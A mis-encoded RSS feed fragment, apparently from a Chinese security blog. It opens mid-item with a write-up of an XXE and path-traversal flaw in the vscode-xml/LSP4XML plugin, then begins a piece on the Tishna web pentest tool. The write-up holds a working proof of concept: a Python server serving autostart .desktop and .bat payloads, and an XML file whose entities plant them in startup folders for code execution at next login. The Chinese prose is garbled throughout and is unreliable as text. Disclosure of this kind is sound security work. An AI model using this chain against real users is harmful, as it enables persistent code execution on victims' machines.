vscode-xmlï¼‰ï¼‰å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡ç›®å½•éå†å†™å…¥ä»»æ„æ–‡ä»¶ã€‚&lt;/blockquote&gt;&lt;h2&gt;XXE å¥‡é‡&lt;/h2&gt;&lt;p&gt;æ‹¿ä¸€ä¸ªæ ‡å‡†çš„ XXE payloadï¼Œå¹¶å¸¦æœ‰æŒ‡å‘æˆ‘ä»¬ç›‘å¬ç½‘ç»œæœåŠ¡å™¨çš„å¤–éƒ¨ DTDï¼Œç›®æ ‡æœåŠ¡å™¨æ— æ³•æ‰§è¡Œå¯¹äº’è”ç½‘çš„ HTTP è¯·æ±‚ï¼Œæ‰€ä»¥æŒ‰é“ç†åªä¼šå­˜åœ¨ä¸€ä¸ª DNS çš„äº¤äº’è¿‡ç¨‹ï¼Œä½†æ˜¯éšåæ”¶åˆ°äº†ä¸¤ä¸ªä¸åŒçš„ DNS äº¤äº’å’Œä¸€ä¸ª HTTP è¯·æ±‚ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ&lt;/p&gt;&lt;h2&gt;æ¢ç©¶&lt;/h2&gt;&lt;p&gt;åœ¨æˆ‘å°è¯•æ‰¾å‡ºäº¤äº’çš„åŸå› æ—¶ï¼Œå‘ç° HTTP è¯·æ±‚æ¥è‡ªæˆ‘è‡ªå·±çš„ IP åœ°å€ï¼Œè¿™å°±å¥‡æ€ªäº†ã€‚&lt;/p&gt;&lt;p&gt;ä¸ºäº†ä¸€æ¢ç©¶ç«Ÿï¼Œå½“æˆ‘åœ¨ VS Code ä¸­ä¿å­˜æ–°çš„ XML payload æ—¶ï¼Œä½¿ç”¨æ–°çš„ Burp Collaborator å®ä¾‹ä½œä¸ºå›è°ƒæœåŠ¡å™¨é‡æ’­æ‰€æœ‰æ“ä½œæ­¥éª¤ï¼Œå¹¶è§¦å‘äº† XXEã€‚ä¸è¿‡ï¼Œå¯èƒ½å’Œ VS Code å¹¶æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ã€‚ã€‚&lt;/p&gt;&lt;p&gt;æ‰€æœ‰ï¼Œå…ˆæ£€æŸ¥äº†ä¸€é VS Code çš„é…ç½®å’Œæ’ä»¶ç­‰ï¼Œç„¶åå‘ç°å®‰è£…äº†ä¸€ä¸ªåä¸º XML çš„æ’ä»¶ï¼Œç”± RedHat å‘å¸ƒçš„ã€‚ï¼ˆåº”è¯¥æ˜¯ VS Code æ¨èå®‰è£…çš„ï¼‰&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML è¯¥æ‹“å±•æ’ä»¶çš„ä½œç”¨æ˜¯æä¾›äº†å¯¹åˆ›å»ºå’Œç¼–è¾‘ XML æ–‡æ¡£çš„æ”¯æŒï¼Œå®ƒåŸºäºä½¿ç”¨ Java è¿è¡Œçš„ LSP4XML è¯­è¨€æœåŠ¡å™¨ã€‚&lt;/blockquote&gt;&lt;p&gt;ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯ç¦ç”¨å®ƒï¼Œç„¶åå†è¿›è¡Œåé¢çš„å®éªŒæ­¥éª¤ã€‚&lt;/p&gt;&lt;p&gt;VSCode-XML ä½¿ä½ å¯ä»¥æ‰“å¼€ XML / DTD / XSTL / XSD æ–‡ä»¶å¹¶è§£æå®ƒä»¬çš„è¯­æ³•é”™è¯¯ï¼Œé‡ç‚¹æ˜¯æ ¹æ® DTD / XSD å®šä¹‰éªŒè¯ XML / XSTL æ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;å¯çŸ¥ XXE æ¼æ´æœ¬èº«åœ¨äº LSP4XMLï¼šåœ¨å®‰è£…äº† VSCode-XML çš„ VS Code ä¸­æ‰“å¼€ XML æ–‡ä»¶ç¼–è¾‘æˆ–ä¿å­˜æ—¶ï¼ŒLSP4XML åœ¨æœ¬åœ°è§£ææ–‡ä»¶å¹¶åœ¨ VS Code ç•Œé¢ä¸­æŠ¥é”™ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä»¥æ­¤æ„é€ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå½“å®‰è£…äº† VSCode-XML çš„ VS Code çš„ç›®æ ‡æ‰“å¼€è¯¥ XML æ–‡ä»¶æ—¶ï¼Œå®ç°ä¸€ç³»åˆ—åˆ©ç”¨æ“ä½œã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å°è¯•äº†åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨çš„å¸¸è§æ¸—é€æ–¹æ³•ï¼Œä½†æ˜¯ç”±äºæœ€è¿‘çš„ Java ç‰ˆæœ¬ï¼ˆ1.8+ï¼‰å’Œ URL è§£æçš„ç»“åˆï¼Œæ‰€æœ‰æ“ä½œéƒ½å¤±è´¥äº†ã€‚&lt;/p&gt;&lt;p&gt;å¯ä»¥æ‰§è¡Œçš„åªæœ‰ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç›² SSRF&lt;/li&gt;&lt;li&gt;Windows ä¸Šçš„ NetNTLMv2 æ¸—é€&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;å®éªŒ&lt;/h2&gt;&lt;p&gt;åœ¨ç© XXE æ—¶ï¼Œå‘ç°ä¸€ç§å¥‡æ€ªçš„çš„è¡Œä¸ºï¼šurl ä»…æœç´¢ä¸€æ¬¡ï¼Œå†æ¬¡è¿›è¡Œæ“ä½œå°±ä¸ä¼šå»æœç´¢ã€‚åº”è¯¥æ˜¯å­˜åœ¨æŸç§ç¼“å­˜æœºåˆ¶ï¼Œå°† DTD çš„æ–‡ä»¶ä¸‹è½½å¹¶å­˜å‚¨åœ¨æŸä¸ªåœ°æ–¹ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç¼“å­˜æœºåˆ¶ï¼š&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;è§£æ XML æ–‡ä»¶&lt;/li&gt;&lt;li&gt;å¦‚æœå¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œåˆ™æ³¨æ˜å…¶ URL&lt;/li&gt;&lt;li&gt;é€šè¿‡æ£€æŸ¥ç›®å½• $HOME/.lsp4xml/cache/http/$host/$path_of_fileï¼Œä½¿ç”¨æŒ‡å®šçš„ URL éªŒè¯æ¥è‡ªåŒä¸€ä¸»æœºçš„æ–‡ä»¶æ˜¯å¦å·²è¢«ç¼“å­˜&lt;/li&gt;&lt;li&gt;å¦‚æœç¼“å­˜æ¡ç›®ä¸å­˜åœ¨ï¼Œåˆ™æ–‡ä»¶è¢«ä¸‹è½½å¹¶ç§»è‡³$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè·¯å¾„èƒ½ä¸èƒ½è¢«æ§åˆ¶ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¦‚æœå¤–éƒ¨å®ä½“ URL è·¯å¾„ä¸­åŒ…å« ../ ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ&lt;/p&gt;&lt;p&gt;ç»å®éªŒï¼Œç¼“å­˜è¿‡ç¨‹åœ¨ä¿å­˜ç¼“å­˜æ–‡ä»¶æ—¶ä¼šå—åˆ°è·¯å¾„éå†çš„å½±å“ï¼Œä»è€Œå¯ä»¥åœ¨ä»»æ„æœ¬åœ°ç›®å½•ä¸­å†™å…¥ä»»æ„è¿œç¨‹æ–‡ä»¶ã€‚å¦‚æœå°šæœªåˆ›å»ºæ‰€éœ€çš„æ–‡ä»¶å¤¹ç»“æ„ï¼Œæ­¤è¿‡ç¨‹ä¹Ÿèƒ½å®ç°ã€‚&lt;/p&gt;&lt;h2&gt;ä» XXE åˆ° RCE&lt;/h2&gt;&lt;p&gt;æ¼æ´å­˜åœ¨çš„åŸå› æ˜¯åœ¨ç¼“å­˜çš„æœ€åä¸€æ­¥ï¼Œå¦‚æœç¼“å­˜æ¡ç›®ä¸å­˜åœ¨ï¼Œåˆ™æ–‡ä»¶è¢«ä¸‹è½½å¹¶ç§»è‡³å¯¹åº”çš„ç›®å½•ï¼Œå…¶ä¸­å‚æ•° $path_of_file å¯è¢«æ§åˆ¶ï¼Œæ¯”å¦‚å¤–éƒ¨å®ä½“çš„ URL ä¸ºï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼“å­˜æ–‡ä»¶å°†è¢«å†™å…¥ $HOME/Desktop/test.txtï¼Œä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶å†™å…¥ã€‚&lt;/p&gt;&lt;p&gt;å”¯ä¸€çš„é™åˆ¶å°±æ˜¯ç¼“å­˜æœºåˆ¶çš„ç¬¬ 3 ç‚¹ï¼Œå› æ­¤æ— æ³•è¦†ç›–ä»»ä½•æ–‡ä»¶ï¼Œå¹¶ä¸”æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä½¿ç”¨å½“å‰ç”¨æˆ·æƒé™å®Œæˆçš„ï¼ˆå› æ­¤ï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å†™ï¼Œå¦åˆ™åªèƒ½åœ¨å…¶ä¸»ç›®å½•å¯å†™ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;å¯ä»¥é€šè¿‡æ»¥ç”¨å¯åŠ¨/è‡ªåŠ¨å¯åŠ¨æœºåˆ¶æ¥è½»æ¾å®ç°RCEï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;åœ¨ Windows ç³»ç»Ÿä¸Šï¼Œé€šè¿‡å°†æ‰¹å¤„ç†æ–‡ä»¶å¼•ç”¨ä¸ºå¤–éƒ¨å®ä½“å¹¶ä½¿ç”¨éå†è·¯å¾„å°†å…¶å†™å…¥ $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ æ–‡ä»¶å¤¹ä¸­ã€‚&lt;/li&gt;&lt;li&gt;åœ¨å¤§å¤šæ•° GNU/Linux ç³»ç»Ÿä¸Šï¼Œé€šè¿‡åœ¨ $HOME/.config/autostart/ æ–‡ä»¶å¤¹ä¸­ç¼–å†™ä¸€ä¸ªâ€œdesktopâ€æ–‡ä»¶ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åªéœ€è¦ç­‰å¾…å—å®³è€…æ³¨é”€å¹¶å†æ¬¡åœ¨å…¶è®¡ç®—æœºä¸Šç™»å½•ä»¥è·å¾—æ‰§è¡Œçš„ä»£ç å³å¯ã€‚&lt;/p&gt;&lt;h2&gt;å½±å“&lt;/h2&gt;&lt;p&gt;åœ¨å®Œæˆ LSP4XML çš„åˆ©ç”¨é“¾ä¹‹åï¼Œé™¤ VSCode-XML ä¹‹å¤–ï¼Œè¿˜å‘ç° Eclipse çš„ wildwebdeveloper æ‰©å±•å’Œ theia-xml-extension ä¹Ÿåœ¨ä½¿ç”¨è¯¥åº“ï¼Œå› æ­¤éƒ½å®¹æ˜“å—åˆ°æ”»å‡»ã€‚&lt;/p&gt;&lt;h2&gt;å®è·µ&lt;/h2&gt;&lt;p&gt;ä»¥ä¸‹æ˜¯åœ¨ Windows å’Œ GNU/Linux ç³»ç»Ÿä¸Šåˆ©ç”¨ XXE å¹¶å®ç° RCE çš„æ­¥éª¤ï¼š&lt;/p&gt;&lt;p&gt;é¦–å…ˆï¼Œå®‰è£… VS Code å’Œ vscode-xml æ‰©å±•&amp;lt;0.9.1ç‰ˆæœ¬ï¼ˆæ³¨æ„ï¼šç›®å‰æœ€æ–°ä¸º 0.10.1ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;åˆ›å»º server.pyï¼ˆPython3ï¼‰å¹¶è¿è¡Œ&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨ VS code ä¸­æ–°å»ºæ–‡ä»¶å¹¶è¾“å…¥ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¿å­˜è¯¥ XML æ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;è§‚å¯Ÿå¯¹ Python3 Web æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œå½“ç”¨æˆ·æ‰§è¡Œæ³¨é”€æˆ–ç™»å½•ï¼Œå°†æ‰§è¡Œæ³¨å…¥å‘½ä»¤ï¼ˆåœ¨ Windows ä¸Šæ‰“å¼€â€œå‘½ä»¤æç¤ºç¬¦â€å¹¶æ‰§è¡Œ whoami å‘½ä»¤ï¼Œåœ¨ GNU/Linux ä¸Šæ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œ id å‘½ä»¤ï¼‰&lt;/p&gt;&lt;p&gt;å…·ä½“æ“ä½œï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;é˜²èŒƒ&lt;/h2&gt;&lt;p&gt;åŠæ—¶æ›´æ–°æ’ä»¶ VS Code-XML çš„ç‰ˆæœ¬ã€‚&lt;/p&gt;&lt;p&gt;æºè‡ªï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-16-103044773</guid>
<pubDate>Thu, 16 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>webè‡ªåŠ¨åŒ–æ¸—é€å·¥å…·ï¼šTishna</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-15-102917681.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102917681&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c2abf4c7be5ea75d1e52dec644467e48_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Tishna&lt;/h2&gt;&lt;p&gt;ä¸€ä¸ªç”¨äº Web æœåŠ¡å™¨ã€Web åº”ç”¨ç¨‹åºåˆ° Web å®‰å…¨æ€§çš„è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶ã€‚æ˜¯ä¸€å¥—å®Œæ•´çš„æœåŠ¡å™¨è‡ªåŠ¨æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œè¦†ç›– web åº”ç”¨å±‚ã€‚&lt;/p&gt;&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;æµ‹è¯•ç¯å¢ƒï¼šKaliï¼ŒParrot OSï¼ŒBlack Archï¼ŒTermuxï¼ŒAndroid Led TV&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç®€ä»‹&lt;/b&gt;&lt;/p&gt;&lt;p&gt;åŒ…å«äº† 62 ä¸ªå…¨è‡ªåŠ¨é€‰é¡¹ï¼Œæ˜¯ä¸€æŠŠå¯ç”¨äº web æ¸—é€çš„åˆ©å™¨ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li&gt;Tishna åœ¨é“¶è¡Œï¼Œç§äººç»„ç»‡å’Œæ¸—é€æµ‹è¯•äººå‘˜ä¸­è¿›æ³•å¾‹å®¡è®¡å¾ˆæœ‰ç”¨&lt;/li&gt;&lt;li&gt;å®ƒæ˜¯ä¸€ç§é˜²å¾¡å·¥å…·ï¼Œå¯æ‰¾åˆ°å°½å¯èƒ½å¤šçš„ä¿¡æ¯ä»¥è·å¾—æœªæˆæƒè®¿é—®å’Œå…¥ä¾µ&lt;/li&gt;&lt;li&gt;éšç€æ›´å…ˆè¿›æŠ€æœ¯çš„å‡ºç°ï¼Œé»‘å®¢è¿˜å‘ç°äº†è¿›å…¥è®¸å¤šç»„ç»‡ç³»ç»Ÿçš„æ›´å¤šæ–¹æ³•&lt;/li&gt;&lt;li&gt;Tishna è½¯ä»¶å¯ä»¥å®¡æ ¸ï¼ŒæœåŠ¡å™¨å’Œ Web è¡Œä¸º&lt;/li&gt;&lt;li&gt;Tishna å¯ä»¥æ‰§è¡Œå°½å¯èƒ½å¤šçš„ç›®æ ‡æ‰«æå’Œæšä¸¾&lt;/li&gt;&lt;li&gt;è¿™æ˜¯é€šè¿‡ä¿æŠ¤æœåŠ¡å™¨å’Œ Web åº”ç”¨ç¨‹åºå®‰å…¨æ€§æ¥é˜»æ­¢ç½‘ç»œç½ªçŠ¯çš„ç¬¬ä¸€æ­¥&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;åŠŸèƒ½&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¿¡æ¯æ”¶é›†&lt;/li&gt;&lt;li&gt;XSS åˆ†æ&lt;/li&gt;&lt;li&gt;CSRF åˆ†æ&lt;/li&gt;&lt;li&gt;ç»•è¿‡&lt;/li&gt;&lt;li&gt;......&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;å®‰è£…&lt;/h2&gt;&lt;p&gt;&lt;b&gt;ç¯å¢ƒï¼šKali Linux&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸‹è½½ï¼š&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ç„¶ååœ¨ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œæ¥æé«˜æ‰€æœ‰ bash æ–‡ä»¶çš„è®¿é—®çº§åˆ«ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;chmod u + x * .sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå®‰è£…å‘½ä»¤ï¼Œè¿›å…¥å®‰è£…æµç¨‹ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./kali_install.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å¯å·¥å…·æ‰«æé€‰é¡¹å‰çš„ç¼–å·è¿›è¡Œï¼Œä¾‹å¦‚ï¼Œæ‰«æ LFI æ¼æ´ï¼Œé”®å…¥ç¼–å· 55 å†è¿›è¡Œç›¸å…³é…ç½®å³å¯ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img 